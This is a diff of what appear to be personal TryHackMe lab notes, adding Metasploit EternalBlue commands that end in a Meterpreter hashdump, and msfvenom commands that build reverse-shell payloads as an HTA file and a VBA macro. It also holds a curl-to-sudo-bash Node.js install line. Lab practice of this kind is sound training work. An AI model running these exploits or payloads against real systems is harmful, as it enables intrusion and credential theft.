@@ -53,7 +53,7 @@ Start teamserver
 
 ```
 cd /opt/armitage/release/unix
-./teamserver 10.10.195.117 password
+./teamserver $IPADDR password
 ```
 
 Start Armitage
@@ -94,7 +94,7 @@ msfconsole
 
 msf5 > search eternalblue
 msf5 > use 2
-msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.0.169
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost $IPADDR
 msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 8888
 msf5 exploit(windows/smb/ms17_010_eternalblue) > run
 meterpreter > hashdump
@@ -117,8 +117,30 @@ Version
 lsb_release -a
 ```
 
-Node
+## Node.js
 ```
 curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
 sudo apt-get install -y nodejs
+```
+
+## Clone this repo
+
+```
+git clone https://github.com/tornord/tryhackme.git
+```
+
+## Get the IP address
+
+```
+IPADDR=$(hostname -I | cut -d' ' -f1)
+```
+
+## Venoms
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IPADDR LPORT=443 -f hta-psh -o thm.hta
+```
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=443 -f vba -o vba.txt
 ```
